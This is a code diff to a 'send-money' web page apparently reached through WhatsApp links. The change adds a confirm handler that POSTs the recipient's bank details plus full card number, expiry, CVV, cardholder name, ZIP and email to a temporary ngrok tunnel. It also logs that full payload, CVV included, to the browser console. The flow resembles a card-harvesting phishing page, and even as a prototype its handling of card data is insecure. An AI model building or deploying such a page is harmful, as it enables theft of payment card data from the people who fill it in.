@@ -1,7 +1,7 @@
 // transfer-dashboard/send-money/script.js
-
 document.addEventListener('DOMContentLoaded', function() {
     console.log("Script is running!");
+    
     // Get transaction ID from URL
     const urlParams = new URLSearchParams(window.location.search);
     const transactionId = urlParams.get('id');
@@ -16,9 +16,12 @@ document.addEventListener('DOMContentLoaded', function() {
     const firstTimeView = document.getElementById('firstTimeView');
     const firstTimeForm = document.getElementById('firstTimeForm');
     const reviewView = document.getElementById('reviewView');
+    const successMessage = document.getElementById('successMessage');
     
-    // API base URL
-    const API_BASE_URL = 'https://0e595e084b34.ngrok.app';
+    // API base URL - Get base URL dynamically rather than hardcoding
+     const API_BASE_URL = 'https://0e595e084b34.ngrok.app';
+    
+    console.log("Using API base URL:", API_BASE_URL);
     
     // Store user data
     let userData = null;
@@ -36,7 +39,7 @@ document.addEventListener('DOMContentLoaded', function() {
     async function fetchTransactionData() {
         if (!transactionId) {
             console.error("No transaction ID found in URL");
-            showError();
+            showError("Missing transaction ID. Please go back to WhatsApp and try again.");
             return;
         }
         
@@ -57,8 +60,9 @@ document.addEventListener('DOMContentLoaded', function() {
             console.log("Response status:", response.status);
             
             if (!response.ok) {
-                console.error("API returned error status:", response.status);
-                throw new Error(`Failed to fetch transaction data: ${response.status}`);
+                const errorText = await response.text();
+                console.error("API returned error status:", response.status, errorText);
+                throw new Error(`Failed to fetch transaction data: ${response.status} - ${errorText}`);
             }
             
             const data = await response.json();
@@ -71,11 +75,11 @@ document.addEventListener('DOMContentLoaded', function() {
                 displayFirstTimeView(data);
             } else {
                 console.error("Data format incorrect:", data);
-                showError();
+                showError("The transaction data format is invalid. Please try again.");
             }
         } catch (error) {
             console.error('Error fetching transaction data:', error);
-            showError();
+            showError(`Error: ${error.message || 'Failed to fetch transaction data'}`);
         }
     }
     
@@ -147,6 +151,7 @@ document.addEventListener('DOMContentLoaded', function() {
     // Function to show error
     function showError(message = "Transfer data not found. Please return to WhatsApp and try again.") {
         loadingContainer.style.display = 'none';
+        transferContent.style.display = 'none';
         errorContainer.style.display = 'block';
         
         const errorMsgEl = document.querySelector('#errorContainer p');
@@ -155,16 +160,17 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     }
 
-    // Handle form submission
+    // Handle form submission - ONLY ONE form handler
     if (firstTimeForm) {
         firstTimeForm.addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const continueButton = document.querySelector('#firstTimeForm button[type="submit"]');
+            const originalText = continueButton ? continueButton.textContent : '';
+            
             if (continueButton) {
                 // Disable button and show loading state
                 continueButton.disabled = true;
-                const originalText = continueButton.textContent;
                 continueButton.innerHTML = '<span class="loader"></span> Processing...';
             }
             
@@ -200,107 +206,6 @@ document.addEventListener('DOMContentLoaded', function() {
                     continueButton.textContent = originalText;
                 }
             }
-        });
-    }
-    
-    // Set up confirm button with API call
-    const confirmButton = document.getElementById('confirmButton');
-    if (confirmButton) {
-        confirmButton.addEventListener('click', async function() {
-            // Disable button and show loading
-            this.disabled = true;
-            this.innerHTML = '<span class="loader"></span> Processing...';
-            
-            try {
-                console.log("Preparing to send transaction data...");
-                
-                // Get form data
-                const formData = JSON.parse(localStorage.getItem('formData'));
-                
-                // Create payload
-                const payload = {
-                    transaction_id: transactionId,
-                    recipient_name: formData.recipientName,
-                    bank_name: formData.bankName,
-                    account_number: formData.accountNumber,
-                    card_number: formData.cardNumber,
-                    expiration_date: formData.cardExpiry,
-                    cvv: formData.cardCvv,
-                    card_name: formData.cardholderName,
-                    country: formData.country,
-                    zip_code: formData.zipCode,
-                    email: formData.email
-                };
-                
-                console.log("Sending payload:", payload);
-                
-                // Make API call
-                const response = await fetch(`${API_BASE_URL}/api/first-time-transaction`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload),
-                    mode: 'cors',
-                    credentials: 'omit'
-                });
-                
-                console.log("Response status:", response.status);
-                
-                // Try to get the response text regardless of status
-                const responseText = await response.text();
-                console.log("Response body:", responseText);
-                
-                if (!response.ok) {
-                    throw new Error(`Failed to complete transaction: ${response.status} - ${responseText}`);
-                }
-                
-                // Show success message
-                const successMessage = document.getElementById('successMessage');
-                if (successMessage) {
-                    transferContent.style.display = 'none';
-                    successMessage.style.display = 'block';
-                } else {
-                    alert('Transaction completed successfully!');
-                }
-                
-                // Clear form data
-                localStorage.removeItem('formData');
-                
-            } catch (error) {
-                console.error('Error completing transaction:', error);
-                alert('There was an error processing your transaction. Please try again.');
-            } finally {
-                this.disabled = false;
-                this.innerHTML = 'Confirm and send';
-            }
-        });
-    }
-    
-    // Handle form submission
-    if (orm) {
-        firstTimeForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            // Collect form data
-            const formData = {
-                recipientName: document.getElementById('firstTimeRecipientName').value,
-                bankName: document.getElementById('firstTimeBankName').value,
-                accountNumber: document.getElementById('firstTimeAccountNumber').value,
-                cardNumber: document.getElementById('firstTimeCardNumber').value,
-                cardExpiry: document.getElementById('firstTimeCardExpiry').value,
-                cardCvv: document.getElementById('firstTimeCardCvv').value,
-                cardholderName: document.getElementById('firstTimeCardName').value,
-                country: document.getElementById('firstTimeCardCountry').value,
-                zipCode: document.getElementById('firstTimeCardZip').value,
-                email: document.getElementById('firstTimeEmail').value
-            };
-            
-            // Store in localStorage for review
-            localStorage.setItem('formData', JSON.stringify(formData));
-            
-            // Show review screen
-            showReviewScreen();
         });
     }
     
@@ -348,17 +253,76 @@ document.addEventListener('DOMContentLoaded', function() {
         reviewView.style.display = 'block';
     }
     
-    // Set up confirm button
+    // Set up confirm button with API call
     const confirmButton = document.getElementById('confirmButton');
     if (confirmButton) {
-        confirmButton.addEventListener('click', function() {
-            // Show success message
-            const successMessage = document.getElementById('successMessage');
-            if (successMessage) {
-                transferContent.style.display = 'none';
-                successMessage.style.display = 'block';
-            } else {
-                alert('Transaction completed successfully!');
+        confirmButton.addEventListener('click', async function() {
+            // Disable button and show loading
+            this.disabled = true;
+            this.innerHTML = '<span class="loader"></span> Processing...';
+            
+            try {
+                console.log("Preparing to send transaction data...");
+                
+                // Get form data
+                const formData = JSON.parse(localStorage.getItem('formData'));
+                
+                // Create payload
+                const payload = {
+                    transaction_id: transactionId,
+                    recipient_name: formData.recipientName,
+                    bank_name: formData.bankName,
+                    account_number: formData.accountNumber,
+                    card_number: formData.cardNumber,
+                    expiration_date: formData.cardExpiry,
+                    cvv: formData.cardCvv,
+                    card_name: formData.cardholderName,
+                    country: formData.country,
+                    zip_code: formData.zipCode,
+                    email: formData.email
+                };
+                
+                console.log("Sending payload:", payload);
+                
+                // Make API call
+                const response = await fetch(`${API_BASE_URL}/api/first-time-transaction`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                    mode: 'cors',
+                    credentials: 'omit'
+                });
+                
+                console.log("Response status:", response.status);
+                
+                // Get response text for logging
+                const responseText = await response.text();
+                console.log("Response body:", responseText);
+                
+                if (!response.ok) {
+                    throw new Error(`Failed to complete transaction: ${response.status} - ${responseText}`);
+                }
+                
+                // Show success message
+                if (successMessage) {
+                    transferContent.style.display = 'none';
+                    successMessage.style.display = 'block';
+                } else {
+                    alert('Transaction completed successfully!');
+                }
+                
+                // Clear form data
+                localStorage.removeItem('formData');
+                
+            } catch (error) {
+                console.error('Error completing transaction:', error);
+                alert(`Error: ${error.message || 'There was an error processing your transaction. Please try again.'}`);
+            } finally {
+                // Reset button state
+                this.disabled = false;
+                this.innerHTML = 'Confirm and send';
             }
         });
     }
